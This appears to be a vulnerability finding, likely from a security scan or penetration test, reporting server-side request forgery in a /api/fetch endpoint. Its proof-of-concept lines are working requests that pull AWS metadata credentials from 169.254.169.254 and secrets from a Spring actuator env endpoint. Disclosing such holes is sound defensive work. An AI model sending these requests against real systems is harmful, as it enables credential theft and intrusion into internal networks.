findings.title: SSRF via /api/fetch — localhost API
findings.description: The /api/fetch endpoint fetched internal/cloud URL: http://localhost:8080/actuator/env. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.
poc_steps: GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/
Returns: AWS IAM role, instance ID, security credentials
GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env
Returns: all Spring environment variables including secrets
